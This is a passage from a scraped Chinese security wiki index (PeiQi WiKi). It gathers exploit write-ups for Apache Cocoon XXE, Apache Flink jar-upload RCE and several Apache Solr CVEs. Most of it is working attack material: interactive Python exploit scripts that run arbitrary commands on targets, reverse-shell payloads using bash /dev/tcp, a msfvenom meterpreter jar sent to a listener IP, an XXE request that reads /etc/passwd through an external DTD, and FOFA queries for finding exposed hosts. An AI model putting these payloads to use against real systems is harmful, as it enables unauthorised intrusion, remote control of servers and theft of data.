时，代码将解析用户提供的 xml。攻击者可以使用包括外部系统实体在内的特制 xml 来访问服务器系统上的任何文件。 影响版本 [!NOTE] Apache Cocoon FOFA [!NOTE] app=\"Apache-Cocoon\" 漏洞复现 向/v2/api/product/manger/getInfo POST如下内容 ]> John &ent; 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Cocoon >> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/v2/api/product/manger/getInfo\" data = \"\"\" ]> John &ent; \"\"\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } response = requests.request(\"POST\", url=vuln_url, data=data, headers=headers, timeout=20) if \"/bin/bash\" in response.text: print(\"\\033[32m[o] 含有CVE-2020-11991漏洞，响应为{}\\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-08 13:01:54 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Flink/":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Flink/","title":"Apache Flink ","keywords":"","body":"Apache Flink Apache Flink PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Flink/Apache=1.9.1远程代码执行.html":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Flink/Apache=1.9.1远程代码执行.html","title":"Apache Flink  <= 1.9.1(最新版本) 远程代码执行 ","keywords":"","body":"Apache Flink 漏洞描述 近日,有安全研究员公开了一个Apache Flink的任意Jar包上传导致远程代码执行的漏洞. 影响范围 Apache Flink FOFA FOFA 语句 app=\"Apache-Flink\" && country=\"CN\" 国内还是很多使用 Apache Flink 的，大概有1000的数量左右 漏洞复现 随便打开一个使用 Apache Flink 的网站，打开后页面为这样子 点击查看文件上传页面 打开MSF 生成一个 jar 木马 msfvenom -p java/meterpreter/reverse_tcp LHOST=39.99.135.123 LPORT=4444 -f jar > test.jar 点击 Add 上传 jar 文件 监听端口 msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload java/shell/reverse_tcp payload => java/shell/reverse_tcp msf6 exploit(multi/handler) > set lhost xxx.xxx.xxx.xxx lhost => xxx.xxx.xxx.xxx msf6 exploit(multi/handler) > set lport 4444 lport => 4444 msf6 exploit(multi/handler) > run 点击下 submit 反弹回来一个root 权限shell 漏洞检测POC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Flink >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jars/upload\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"Unable to load requested file /jars/upload.\" in response.text: print(\"\\033[32m[o] 可能存在 Apache Flink >> \\033[0m\")) POC_1(target_url) 修复方法 关闭文件上传调试模块 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Kylin/":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Kylin/","title":"Apache Kylin","keywords":"","body":"Apache Kylin Apache-kylin 未授权配置泄露 CVE-2020-13937 Apache Kylin 命令注入漏洞 CVE-2020-1956 Apache Kylin 命令注入漏洞 CVE-2020-13925 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Solr/":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Solr/","title":"Apache Solr","keywords":"","body":"Apache Solr Apache Solr RCE 远程执行漏洞 CVE-2019-0193 Apache Solr Velocity模板远程执行 CVE-2019-17558 Apache Solr 远程命令执行漏洞 CVE-2017-12629 Apache Solr XXE 漏洞 CVE-2017-12629 Apache Solr JMX服务 RCE CVE-2019-12409 Apache Solr RCE 未授权上传漏洞 CVE-2020-13957 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Solr/Apache Solr 远程执行漏洞 CVE-2019-0193.html":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Solr/Apache Solr 远程执行漏洞 CVE-2019-0193.html","title":"Apache Solr 远程执行漏洞 CVE-2019-0193","keywords":"","body":"Apache Solr 远程执行漏洞 CVE-2019-0193 漏洞描述 2019 年 08 月 01 日，Apache Solr 官方发布预警，Apache Solr DataImport 功能 在开启 Debug 模式时，可以接收来自请求的”dataConfig”参数，这个参数的功能与data-config.xml 一样，不过是在开启 Debug 模式时方便通过此参数进行调试，并且 Debug 模式的开启是通过参数传入的。在 dataConfig 参数中可以包含 script 恶意脚本导致远程代码执行。 影响版本 [!NOTE] Apache Solr 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-0193 docker-compose build docker-compose up -d # 创建一个solr核心test docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 点击刚刚创建的test进入调试 将下面的POC代码填入 Debug-Mode 中 注意 POC 执行的代码中的base64字符串的位置请置换成自己的ip地址并base64加密填入 [!NOTE] bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 直接如上写入反弹无反应，不稳定，需要base64加密写才能反弹一个shell 点击EXecute执行代码 成功反弹shell 漏洞利用POC [!NOTE] POC不支持反弹shell，如需反弹shell，请按如上步骤反弹shell #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(命令执行) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): mode_url = target_url + \"/solr/\" + core_name + \"/admin/mbeans?cat=QUERY&wt=json\" response = requests.request(\"GET\", url=mode_url, timeout=20) mode = dict(dict(list(json.loads(response.text)[\"solr-mbeans\"])[1])['/dataimport'])['class'] if \"org.apache.solr.handler.dataimport.DataImportHandler\" in mode: print(\"\\033[32m[o] 目标Url,Dataimport模块开启\\033[0m\") else: print(\"\\033[31m[x] 目标Url,Dataimport模块未开启\\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vuln_url = target_url + \"/solr/\" + core_name + \"/dataimport\" headers = { 'Host': target_url, 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", 'Accept': \"application/json, text/plain, */*\", 'Accept-Language': \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", 'Accept-Encoding': \"zip, deflate\", 'Referer': \"\" + target_url + \"/solr/\", 'Content-type': \"application/x-www-form-urlencoded\", 'X-Requested-With': \"XMLHttpRequest\", 'Content-Length': \"1007\", 'Connection': \"close\" } payload = \"\"\" command=full-import&verbose=false&clean=false&commit=false&debug=true&core=test&name=dataimport&dataConfig= \"\"\" % cmd response = requests.request(\"POST\", url=vuln_url, data=payload, headers=headers, timeout=30) try: get_message = list(json.loads(response.text)[\"documents\"])[0] message = dict(get_message)['title'][0] print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\", message) except: print(\"\\033[31m[x] 代码执行失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) else: POC_3(target_url, core_name, cmd) 参考文章 apache solr远程代码执行漏洞(cve-2019-0193) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Solr/Apache Solr Velocity模板远程执行 CVE-2019-17558.html":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Solr/Apache Solr Velocity模板远程执行 CVE-2019-17558.html","title":"Apache Solr Velocity模板远程执行 CVE-2019-17558","keywords":"","body":"Apache Solr Velocity模板远程执行 CVE-2019-17558 漏洞描述 2019年10月末，GitHub代码中安全研究员S00pY发布一个Apache Solr Velocity模版注入远程命令执行的POC，发现网络上出现针对Apache Solr服务器的远程代码执行漏洞。该漏洞是由于Velocity模板存在注入所致（Velocity是一个基于Java的模板引擎，可让使用者通过模板语言引用Java中定义的对象）。攻击者在知道Solr服务器上Core名称后，先把params.resource.loader.enabled设置为true（就可加载指定资源），再进行远程执行命令。 影响版本 [!NOTE] Apache Solr 5.x 至 8.2.0 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-17558 docker-compose build docker-compose up -d # 创建一个solr核心test docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 打开后获取 Core 信息 得知 test 这个 Core 存在 访问 http://xxx.xxx.xxx.xxx:8983/solr/test/config 正常 访问Core的config配置信息时，通过POST请求把params.resource.loader.enabled设置为 True，再通过精心构造的get请求即可RCE，此时用户就可以加载指定资源，构造一个能执行命令的恶意请求 设置params.resource.loader.enabled为True POST /solr/test/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close Content-Length: 259 { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } 命令执行 再使用POC造成命令执行 http://xxx.xxx.xxx.xxx:8983/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=\"\")+%23set($rt=$x.class.forName(\"java.lang.Runtime\"))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName(\"java.lang.String\"))+%23set($ex=$rt.getRuntime().exec(\"whoami\"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end 反弹hell，因为部分命令会被过滤导致返回 Error 500 ，所以反弹shell需要用另外的反弹shell方法 POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 POC需要Urlencoding进行编码才能绕过 POC ： %2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr 5.0.0 - 8.3.1 \\033[0m') print('+ \\033[36m使用格式: python3 cve-2019-17558.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(命令执行) \\033[0m') print('+ \\033[36mCmd >>> shell(反弹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): open_params = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POST请求成功将params.resource.loader.enabled设置为True \\033[0m\") else: print(\"\\033[31m[x] POST请求params.resource.loader.enabled设置为True失败 \\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] 代码执行失败，响应为 Error 500 \\033[0m\") else: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) def POC_4(target_url, core_name, IP, POST): # POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, POST) vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == \"__main__\": title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_4(target_url, core_name, IP, PORT) else: POC_3(target_url, core_name, cmd) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Solr/Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629.html":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Solr/Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629.html","title":"Apache Solr RCE 远程执行漏洞 CVE-2017-12629","keywords":"","body":"Apache Solr RCE 远程执行漏洞 CVE-2017-12629 漏洞描述 Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。 影响版本 [!NOTE] Apache Solr 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629 docker-compose build docker-compose up -d 漏洞复现 远程命令执行 先请求url地址获取 core 内容 http://xxx.xxx.xxx.xxx:8983/solr/admin/cores [!NOTE] 通过查看代码，能够触发命令执行的事件有两个：postCommit 和 newSearcher 使用 postCommit 第一个请求包用于载入缓存中 [!NOTE] exe : ping 执行的命令 dir: 命令存在的目录位置 args:命令参数 如下请求包执行的是 /bin/ping 1.1.1.1 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"postCommit\", \"name\":\"newlistener-1\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"ping\", \"dir\":\"/bin/\", \"args\":[\"1.1.1.1\"] } } 第二个请求包用于更新缓存并执行命令 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 [{\"id\":\"test\"}] [!NOTE] 注意 第一个请求包的这个位置 \"name\":\"newlistener-1\", listerer的名字需要替换，例如第一次 为 newlistener-1 ，第二次则需要改为 newlistener-2 注意 第二个请求包的这个位置 [{\"id\":\"test\"}]， 同第一个请求包的name，每执行一次就需要更换 id ,例如第一次 为 test ，第二次则需要改为 tset-2 注意 Content-Type: application/json 需要添加 不更改执行发生报错示例 进入docker容器查看发现命令已经执行 使用 newSearcher 使用 newSearcher可以直接加载入缓存执行命令 请求包如下 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"newSearche\", \"name\":\"newlistener-2\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"bash\", \"dir\":\"/bin/\", \"args\":[\"/tmp/vuln\"] } } [!NOTE] 注意点同上，也需要每次执行更改 \"name\":\"newlistener-2\" 的参数 成功执行了创建文件的命令 关于 如果想要执行其他命令,则需要命令的的位置，例如执行ping，则需要设置dir参数为 /usr/bin/ping 或者 /bin/ping，如果需要检测漏洞是否存在则可以使用 dnslog来检测 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslog地址(漏洞外连检测) \\033[0m') print('+ \\033[36mCmd >>> shell(反弹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url, n): exp_url = target_url + \"/solr/\" + core_name + \"/config\" dnslog_url = \"`whoami`.\" + dnslog_url headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"curl\",\"dir\":\"/usr/bin/\",\"args\":[\"%s\"]}} \"\"\" % (n, dnslog_url) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] 成功执行，请查看dnslog \\033[0m\") else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") def POC_3(target_url, core_name, n, ip, port): exp_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/%s/%s 0>&1\"]}} \"\"\" % (n, ip, port) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] 成功执行 \\033[0m\") else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_3(target_url, core_name, n, IP, PORT) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35m请输入你的dnslog地址：\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) [!NOTE] 如果shell或dnslog无反应，可以选择更改一下POC的部分参数执行需要的代码 参考文章 Apache Solr远程代码执行漏洞（CVE-2017-12629）从利用到入侵检测 cve-2017-12629 apache solr xxe & rce 漏洞分析 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Solr/Apache Solr XXE 漏洞 CVE-2017-12629.html":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Solr/Apache Solr XXE 漏洞 CVE-2017-12629.html","title":"Apache Solr XXE 漏洞 CVE-2017-12629","keywords":"","body":"Apache Solr XXE 漏洞 CVE-2017-12629 漏洞描述 Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE）。 影响版本 Apache Solr 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629-XXE docker-compose build docker-compose up -d 漏洞复现 Dnslog 先请求url地址获取 core 内容 http://xxx.xxx.xxx.xxx:8983/solr/admin/cores 访问 http://xxx.xxx.xxx.xxx:8983/solr/demo/select?q={!xmlparser v=''}&wt=xml 查看dnslog得到请求 远程读取文件 在自己的服务器上写入一个可访问的XML文件，内容写入 \"> 然后请求这个文件来读取服务器上的文件 http://xxx.xxx.xxx.xxx:8983/solr/demo/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser [!NOTE] 注意这里的payload进行了url编码,请求的文件为 http://peiqi.tech/1.dtd，有更多需求自行更改写入的xml文件 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslog地址(漏洞外连检测) \\033[0m') print('+ \\033[36mCmd >>> xxe_file(读取/etc/passwd) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url): dns_payload = \"\"\" /solr/%s/select?q={!xmlparser v=''}&wt=xml \"\"\" % (core_name, dnslog_url) vuln_url = target_url + dnslog_url headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"HTTP ERROR 500\" in response.text: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") else: print(\"\\033[32m[o] 请查看dnslog响应 \\033[0m\") except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") def POC_3(target_url, core_name): file_payload = \"\"\"/solr/{}/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser\"\"\".format(core_name) vuln_url = target_url + file_payload headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"/usr/sbin\" in response.text: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35m请输入你的dnslog地址：\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) elif cmd == \"xxe_file\": POC_3(target_url, core_name) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Solr/Apache Solr JMX服务 RCE CVE-2019-12409.html":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Solr/Apache Solr JMX服务 RCE CVE-2019-12409.html","title":"Apache Solr JMX服务 RCE  CVE-2019-12409","keywords":"","body":"Apache Solr JMX服务 RCE CVE-2019-12409 漏洞描述 Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX 作为 Java的一种Bean管理机制，如果JMX服务端口暴露，那么远程攻击者可以让该服务器远程加载恶意的Bean文件，随着Bean的滥用导致远程代码执行。 影响版本 [!NOTE] Apache Solr 8.1.1 Apache Solr 8.2.0 环境搭建 下载 Apache Solr 8.2.0 也可以docker搭建 docker pull solr:8.2.0 docker run --name solr -d -p 8983:8983 -t solr:8.2.0 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 查看搭建的Solr是否存在漏洞,查看solr.in.sh配置文件中的ENABLE_REMOTE_JMX_OPTS选项设置是否为“Ture”，如果为Ture，则存在漏洞 查看漏洞端口18983是否开放 [!NOTE] nmap xxx.xxx.xxx.xxx -p 18983 root@kali:~/桌面# msfconsole , , / \\ ((__---,,,---__)) (_) O O (_)_________ \\ _ / |\\ o_o \\ M S F | \\ \\ _____ | * ||| WW||| ||| ||| =[ metasploit v5.0.101-dev ] + -- --=[ 2049 